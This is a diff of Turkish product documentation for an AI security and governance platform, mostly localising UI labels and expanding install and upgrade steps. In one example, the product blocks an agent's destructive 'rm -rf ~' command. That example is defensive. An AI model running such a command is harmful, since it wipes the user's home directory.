+   Firefox, Mozilla imzalı XPI'ı kullanır. Bkz.
+   [Browser Guard'ı kurumda dağıtma](../../../installation/browser-guard-enterprise.tr.md).
+2. **API anahtarları** sayfasında yazma yetkili bir tenant API anahtarı oluşturun.
+3. **Browser Guard → Tarayıcıları kaydedin** altında koruma modunu (`auto`, `confirm`,
+   `block` veya `monitor`; konsolda **Otomatik maskele**, **Bana sor**, **Engelle**,
+   **Yalnızca say (maskeleme yok)**) seçin, politika JSON'unu kopyalayın, `apiKey` yer tutucusunu
    değiştirin ve tarayıcı yönetim aracınızla dağıtın. Örnek dosyalar
    [deploy/browser-guard](../../../../deploy/browser-guard/README.md) altındadır.
 
@@ -627,7 +671,7 @@ Gizlilik taramaları denetim dışa aktarımına dahil değildir.
 **Ne yapar.** Hangi yapay zekâ sistemlerinin kullanıldığını, kimin sorumluluğunda ve hangi
 amaçla olduğunu, kimin hangi yapay zekâyı kullanabileceğini ve bunu kimin onayladığını,
 hangi istisnaların ne zamana kadar geçerli olduğunu ve güvenlik politikasını kimin, kimin
-onayıyla değiştirdiğini kaydeder. Sayfalar: **AI register** (`/governance/register`),
+onayıyla değiştirdiğini kaydeder. Sayfalar: **Yapay zekâ varlık envanteri** (`/governance/register`),
 **Requests & exceptions** (`/governance/requests`) ve **Change control**
 (`/governance/change-control`).
 
@@ -644,7 +688,7 @@ yerde denetimi de yönlendiren tek bir kayıttan gelmelidir.
   **Import observed AI systems**, kontrol düzleminin gördüğü her ajan, MCP sunucusu,
   yapay zekâ sitesi ve model uç noktası için `proposed` durumunda kayıt ekler.
 - **Bir durum neyi uygular.** Yasaklı bir MCP sunucusu her yönetilen connector tarafından
-  engellenir (`deny`); kısıtlı olan bant dışı onay gerektirir (`ask`). Listeler, yayımlanan
+  engellenir (`deny`); kısıtlı olan bir kişinin onayını gerektirir (`ask`). Listeler, yayımlanan
   çalışma zamanı politikasının yanında, özeti doğrulanarak bir sonraki politika
   yenilemesinde connector'lara ulaşır. Yasaklı bir yapay zekâ sohbet sitesi, yöneticinin
   tarayıcı yönetimiyle dağıttığı bir **Browser Guard yönetilen politika parçasında**
@@ -664,7 +708,7 @@ yerde denetimi de yönlendiren tek bir kayıttan gelmelidir.
   uygular; kapatmak da bir değişiklik talebidir.
 - Her değişiklik çok faktörlü doğrulama gerektirir ve aynı işlemde denetim kaydına yazılır.
 
-**Nasıl kullanılır.** **AI register** sayfasını açın, **Import observed AI systems**
+**Nasıl kullanılır.** **Yapay zekâ varlık envanteri** sayfasını açın, **Import observed AI systems**
 seçeneğini kullanın, ardından sahip ve gözden geçirme tarihlerini atayın. Dört gözü
 **Change control** sayfasından açın (iki etkin sahip ya da yönetici gerekir). Ayrıntılar:
 [ai-governance.md](../../../ai-governance.md).
@@ -687,7 +731,7 @@ görünür. Envanter bir kayıt ve denetim aracıdır; yasal uyumluluk beyanı d
 
 ### Yönetişim skor kartı, çerçeve eşlemesi ve zamanlanmış özet
 
-**Ne yapar.** **Governance** (`/governance`, sahipler ve yöneticiler) 7, 30 ya da 90
+**Ne yapar.** **Yapay zekâ yönetişimi** (`/governance`, sahipler ve yöneticiler) 7, 30 ya da 90
 günlük bir pencere için skor kartı gösterir: öne çıkan riskler, çerçeve kapsamı, yapay zekâ
 kullanımı, ajan kararları, insan gözetimi, olaylar ve duruş, Browser Guard ve kabul
 edilebilir kullanım kapsamı, politika güncelliği ve NIST AI RMF, ISO/IEC 42001, AB Yapay
@@ -714,7 +758,7 @@ duyar.
 - *Print / save as PDF* kendi içinde tam bir A4 sürümü üretir; imzalı kanıt için
   [uyum kanıt raporu](#uyum-kanıt-raporu) kullanılır.
 
-**Nasıl kullanılır.** **Governance** sayfasını açın, bir pencere seçin ve özeti
+**Nasıl kullanılır.** **Yapay zekâ yönetişimi** sayfasını açın, bir pencere seçin ve özeti
 **Scheduled summary** altından açın. Ayrıntılar:
 [ai-governance-frameworks.md](../../../ai-governance-frameworks.md).
 
@@ -831,7 +875,7 @@ için döndürür (`delivery: "manual"`). Başarısız bir gönderim, bağlantı
 `email_delivery: "failed"` olarak bildirilir. Bağlantı hiçbir zaman günlüğe yazılmaz.
 `team_members` üzerindeki RLS aynı rol kurallarını tekrarlar; API ile sayfa atlatılamaz.
 
-**Nasıl kullanılır.** **Team** sayfasında e-postayı ve rolü girip daveti gönderin. Yanıt
+**Nasıl kullanılır.** **Ekip** sayfasında e-postayı ve rolü girip daveti gönderin. Yanıt
 teslimatın manuel olduğunu söylüyorsa bağlantıyı kopyalayın. Rolleri üye listesinden
 değiştirin veya üyeleri kaldırın. **Team audit** altında **Prepare CSV export** veya
 **Prepare JSON export** kullanın.
@@ -907,7 +951,7 @@ kullanıldığını tek yerde görmelidir. Bekleyen bir sipariş asla kapasiteye
 operatör lisansı tanımladıktan sonra değişir. Kart ödemesi yalnızca açıkça etkinleştirilmiş
 self-service derlemelerde görünür (bkz. [ödeme yolları](#ödeme-yolları-fatura-ve-kart)).
 
-**Nasıl kullanılır.** Owner veya admin **Billing** sayfasında planı, dönemi ve geliştirici
+**Nasıl kullanılır.** Owner veya admin **Faturalandırma** sayfasında planı, dönemi ve geliştirici
 koltuk sayısını (en az plan asgarisi) seçip **Request upgrade** düğmesine basar.
 
 **Örnek.** Bir owner 30 koltuk için Business talep eder. Sayfa "This request is reviewed
@@ -966,7 +1010,7 @@ alma prosedürü tamamlanmadan "SAML zorunlu" sağlayıcı politikasını açmay
 
 ### SCIM dizin senkronizasyonu
 
-**Ne yapar.** `/scim` (**Directory provisioning**, yalnızca sahipler) SCIM 2.0 taşıyıcı
+**Ne yapar.** `/scim` (**Dizin senkronizasyonu**, yalnızca sahipler) SCIM 2.0 taşıyıcı
 (bearer) kimlik bilgileri üretir ve değişmez IdP grup kimliklerini AIDR rollerine eşler.
 IdP ardından kullanıcıları ve grupları `https://<api-host>/functions/v1/scim/v2` adresine
 (`/Users`, `/Groups`) aktarır.
@@ -1143,7 +1187,7 @@ teklif veya sipariş geçerlidir):
 | Satın alma | Kayıt ol | Etkinse self-service kart, değilse fatura | Satış destekli, fatura | Satış destekli, fatura |
 | Yerel tespit motoru (`local_detection`) | Evet | Evet | Evet | Evet |
 | Kontrol düzlemi konsolu (`dashboard`): olaylar, olası olaylar, ajanlar, politikalar, DLP düzenleyicisi, API anahtarları, ekip, ayarlar, faturalama | Evet | Evet | Evet | Evet |
-| Browser Privacy Guard (`browser_privacy_guard`) | - | Evet | Evet | Evet |
+| Browser Guard (`browser_privacy_guard`) | - | Evet | Evet | Evet |
 | Microsoft Entra ID SSO (`entra_sso`) | - | Evet | Evet | Evet |
 | SIEM dışa aktarımı (`siem_export`) | - | - | Evet | Evet |
 | SCIM senkronizasyonu (`scim`) | - | - | Evet | Evet |
@@ -1153,7 +1197,7 @@ teklif veya sipariş geçerlidir):
 
 Yerel tespit her uç noktada, bir plan veya hesap **olsun ya da olmasın** çalışır.
 
-**Nasıl kullanılır.** **Billing** sayfasına bakın veya oturum açmış bir kullanıcı olarak
+**Nasıl kullanılır.** **Faturalandırma** sayfasına bakın veya oturum açmış bir kullanıcı olarak
 `public.plans` tablosunu sorgulayın. Fiyatlandırma ve teklif için anil@singularityrd.com
 adresine yazın.
 
@@ -1187,7 +1231,7 @@ deneme kullanmamış bir kullanıcı gerekir. Auth meta verisindeki deneme işar
 değiştirilemez. Ingest ve kayıt `tenant_admission_capacity` değerini kontrol eder. Kabul
 edilmiş kapasitesi olmayan bir tenant yeni ajanları reddeder.
 
-**Nasıl kullanılır.** Bulut müşterileri denemeyi **Connect** sayfasından başlatır. Ücretli
+**Nasıl kullanılır.** Bulut müşterileri denemeyi **İlk kurulum** sayfasından başlatır. Ücretli
 koşullar aşağıdaki yollarla gelir. Faturalama sayfası kabul durumunu ve dönem sonunu
 gösterir.
 
@@ -1357,7 +1401,7 @@ olana kadar imleci izleyin. Her sayfa tek bir anlık görüntüye bağlıdır. E
 saklama** (legal hold) dışa aktarımı engeller (`409 legal_hold_active`); saklama satırı
 okunamazsa işlem reddedilir.
 
-**Nasıl kullanılır.** **Team** sayfasında **Prepare CSV export** veya **Prepare JSON
+**Nasıl kullanılır.** **Ekip** sayfasında **Prepare CSV export** veya **Prepare JSON
 export**, ardından **Save audit export** düğmesine basın.
 
 **Örnek.** 1.320 kayıtlık bir dışa aktarım üç sayfa halinde gelir. Konsol her sayfanın
@@ -1414,7 +1458,7 @@ indekslendiğini veya alarm üretildiğini kanıtlamaz.
 ### Uyum kanıt raporu
 
 **Ne yapar.** Sahipler (owner) ve yöneticiler (admin), seçtikleri bir dönem (en fazla 366
-gün) için tenant kapsamlı bir JSON raporunu **Compliance** (`/compliance`) sayfasından
+gün) için tenant kapsamlı bir JSON raporunu **Uyum raporu** (`/compliance`) sayfasından
 veya `compliance-report` API'sinden üretir. Rapor, güvenlik ve KVKK/DPO ekiplerinden
 genellikle istenen kanıtları bir araya getirir: tenant profili ve saklama ayarları,
 çalışma ortamına göre koruma kapsamı, Browser Guard'ın veri türü, AI sitesi ve güne göre
@@ -1436,7 +1480,7 @@ yönetici denetim günlüğüne (`compliance_report.generated`) yazılır. Üret
 gerektirir, kimlik bariyerinden geçer, hız sınırına tabidir (kullanıcı başına dakikada 3)
 ve her adımda hata durumunda reddeder (fail-closed).
 
-**Nasıl kullanılır.** **Compliance** sayfasını açın, bir dönem seçin ve **Generate report**
+**Nasıl kullanılır.** **Uyum raporu** sayfasını açın, bir dönem seçin ve **Generate report**
 düğmesine basın. Ardından JSON'u (yetkili belge), her bölüm tablosu için bir CSV içeren
 ZIP paketini veya Türkçe ya da İngilizce yazdırılabilir raporu (**Print / save as PDF**)
 indirin. Denetçiler JSON'u çevrimdışı doğrular:
@@ -1471,7 +1515,7 @@ sahipleri ve yöneticileri gerçek zamanlı alarmları **Slack**'e (incoming web
 mesajı), **Microsoft Teams**'e (workflow webhook, Adaptive Card), **imzalı bir HTTPS
 webhook**'a (JSON şeması `aidr.notification.v1`) veya **e-posta** ile (1–10 alıcı)
 gönderir. Her kanal kendi olaylarını seçer: en az belirli bir önem derecesindeki yeni
-olaylar (incident), kritik çalışma zamanı engellemeleri (deny), bant dışı onay bekleyen
+olaylar (incident), kritik çalışma zamanı engellemeleri (deny), bir kişinin onayını bekleyen
 eylemler ve Browser Guard'ın engellediği istemlerdeki ani artışlar (örneğin 15 dakikada
 10 engellenen gönderim).
 
@@ -1550,7 +1594,7 @@ Bir silinme kaydı (tombstone) ve aşama makbuzlarını tutar. Posture satırlar
 olaylarıyla birlikte zincirleme silinir; satır kaldığı sürece bir kalıntı koruması
 offboarding'in tamamlanmasını engeller.
 
-**Nasıl kullanılır.** Owner çalışma alanını **Settings** üzerinden kapatır. Self-hosted
+**Nasıl kullanılır.** Owner çalışma alanını **Ayarlar** üzerinden kapatır. Self-hosted
 dağıtım operatörleri offboarding'i önce deneme çalıştırmasıyla yürütebilir:
 ```sh
 node scripts/deployment-offboarding.mjs /srv/aidr --tenant <tenant-uuid>
@@ -1678,8 +1722,13 @@ bilgisayarda bile çalışır ve kontrol düzlemi ya da lisans ortadan kalksa da
 listeleri, denetim günlüğü ve operatör onayları (`aidr pending`, `aidr approve`) uç
 noktada `~/.singularity-aidr/` altında bulunur.
 
-**Nasıl kullanılır.** Bir bağlayıcı kurun ve `aidr setup` çalıştırın. Ayrıntılar için
-[configuration.md](../../../configuration.md) dosyasına bakın.
+**Nasıl kullanılır.** Windows ve Linux'ta masaüstü kurulum dosyasını çalıştırın:
+kullanıcı için AIDR'yi kurar (`aidr setup`) ve sürüm anahtarını ayarlar. Aksi hâlde bir
+bağlayıcı paketi kurun ve `aidr setup --release-key <dosya.pem>` çalıştırın (sürüm
+anahtarını ayarlar ve AIDR'yi tek seferde yapılandırır). `aidr status` ve `aidr verify` ile
+denetleyin. Kurulum dosyasıyla kurulan uç noktalar `aidr update` ile güncellenir. Bkz.
+[Masaüstü kurulum dosyaları](../../../installation/desktop-installers.tr.md) ve
+[configuration.md](../../../configuration.md).
 
 **Örnek.** Kurumsal ağa bağlı olmayan bir yüklenici dizüstü bilgisayarı, bir ajanın
 çalıştırdığı `rm -rf ~` komutunu yine engeller ve kararı yerel denetim günlüğüne yazar.
@@ -1707,8 +1756,11 @@ bunlar [`deploy/regions.manifest.json`](../../../../deploy/regions.manifest.json
 beyan olarak kayıtlıdır. Bir bölge, barındırılan projesi, veri yerleşimi koşulları ve alt
 işlemci listesi onaylandığında kullanılabilir olur.
 
-**Nasıl kullanılır.** Kayıt açıksa kaydolun, denemeyi başlatın, uç noktaları kaydedin,
-bağlayıcıları ve Browser Guard'ı dağıtın, ardından politika yayımlayın. Ayrıntılar için
+**Nasıl kullanılır.** Kayıt açıksa kaydolun, denemeyi başlatın, **İndirmeler**
+sayfasından Windows ya da Linux kurulum dosyasını indirin (ya da Intune, SCCM, GPO veya
+Linux paket deponuzla dağıtın), uç noktaları kaydedin, Browser Guard'ı tarayıcı
+mağazalarından dağıtın, ardından politika yayımlayın. Kayıtlı uç noktalar güncellemeleri
+aynı portaldan `aidr update` ile alır. Ayrıntılar için
 [saas.md](../../../deployment/saas.md) dosyasına bakın.
 
 **Örnek.** 10 geliştiricili bir ekip denemeyi başlatır, bir ajan kaydeder, ardından
@@ -1976,9 +2028,15 @@ planlayın. `AIDRCertificateExpiresSoon` alarmı bunun için yardımcı olur.
 
 ### Yükseltme ve geri alma
 
-**Ne yapar.** Compose için `scripts/deployment-upgrade.mjs`, yükseltmeyi `preflight`,
-`apply`, `resume` ve `recover` komutlarıyla yürütür ve **sinyallere karşı güvenlidir**
-(signal-safe). Helm'de `helm upgrade`, migration'ları `pre-upgrade` hook'u olarak çalıştırır.
+**Ne yapar.** Compose kurulumu tek komutla yükseltilir:
+`pnpm onprem:upgrade --to <yeni sürüm dizini>` (`scripts/onprem-upgrade.mjs`) denetim,
+şifreli yedek, yedek doğrulama, preflight, apply, yeniden başlatma, çevrimiçi doctor ve
+salt okunur yükseltme sonrası denetimleri sırayla çalıştırır, ilk başarısız adımda durur
+ve tam kurtarma adımını Türkçe ya da İngilizce yazar. Altta
+`scripts/deployment-upgrade.mjs` `preflight`, `apply`, `resume` ve `recover` komutlarını
+yürütür ve **sinyallere karşı güvenlidir** (signal-safe). Helm'de `helm upgrade`,
+migration'ları `pre-upgrade` hook'u olarak çalıştırır. Yükseltme sırasında uç noktalar
+yerel olarak korumaya devam eder.
 
 **Neden önemli.** Şemayı yarım uygulanmış bırakan, kesintiye uğramış bir yükseltme, bir
 kontrol düzleminin yaşayabileceği en kötü kesintidir.
@@ -1993,7 +2051,14 @@ yapan adımlar tamamlanır. Şema kaydından önce, bakımdan önce çalışan s
 başlatır; kayıttan sonra onları trafiğe kapalı tutar. Devam edilebilecek aşamayı kaydeder
 ve `130` veya `143` ile çıkar. Başarısız her apply bir geri alma planı yazar.
 
-**Nasıl kullanılır.**
+**Nasıl kullanılır.** Yeni sürümü kendi dizininde hazırlayın, ardından bakım
+penceresinde:
+```sh
+pnpm onprem:upgrade --to /srv/aidr-target --dry-run   # planı gösterir, hiçbir şeyi değiştirmez
+pnpm onprem:upgrade --to /srv/aidr-target             # yükseltmeyi çalıştırır
+pnpm onprem:upgrade --to /srv/aidr-target --resume    # yarıda kalan yükseltmeyi sürdürür
+```
+Tek tek adımlar da kullanılabilir:
 ```sh
 node scripts/deployment-upgrade.mjs preflight --current /srv/aidr --target /srv/aidr-target \
   --backup /backups/aidr-pre-upgrade --key-file /secure/aidr-recovery.key \
@@ -2002,7 +2067,8 @@ node scripts/deployment-upgrade.mjs apply ... --maintenance     # aynı seçenek
 node scripts/deployment-upgrade.mjs resume ... --maintenance    # kesintiden sonra
 ```
 Hazırlık adımını asla `/srv/aidr` üzerinde yeniden çalıştırmayın; yeni sürümü yeni bir
-dizinde hazırlayın.
+dizinde hazırlayın. Helm ve air-gapped yolları dahil adım adım:
+[On-prem kurulumu yükseltme](../../../operations/onprem-upgrade.tr.md).
 
 **Örnek.** Değişiklik penceresi erken biter ve operatör dosya kurulumu sırasında bir kez
 `SIGTERM` gönderir. Araç o adımı bitirir, `interrupted_by` kaydeder ve `143` ile çıkar.
@@ -2053,7 +2119,7 @@ telemetri planlama modeli. Bu varsayımları gerçek müşteri verisiyle değiş
 | Cihaz koduyla kayıt | - | Evet | Evet (imzalayıcıyla) | İmzalayıcı chart'ta yok; kayıt belirteci kullanın veya ekleyin | Evet (imzalayıcıyla) |
 | API anahtarları ve kayıt belirteçleri | - | Evet | Evet | Evet | Evet |
 | Çalışma zamanı politikası, kademeli dağıtım, DLP düzenleyicisi | Yalnızca yerel politika dosyası | Evet | Evet | Evet | Evet |
-| Browser Privacy raporlaması | Eklenti yerelde maskeler, rapor yok | Evet | Evet | Evet | Evet |
+| Browser Guard raporlaması | Eklenti yerelde maskeler, rapor yok | Evet | Evet | Evet | Evet |
 | Yapay Zekâ Güvenlik Duruşu sayfası | Tarayıcılar yerelde çalışır, sayfa yok | Evet | Evet | Evet | Evet (iç hedefler) |
 | Panelden onay, yapay zekâ envanteri, değişiklik denetimi, yönetişim skor kartı | Yalnızca terminalden onay | Evet | Evet | Evet | Evet |
 | Derin tarama yan konteyneri | İsteğe bağlı loopback köprü | Barındırılan hizmette listelenmemiş | İsteğe bağlı `--with-posture-scanner` | İsteğe bağlı `postureScanner.enabled` | İsteğe bağlı; uzak taramalar yalnızca çıkış izin listesiyle |
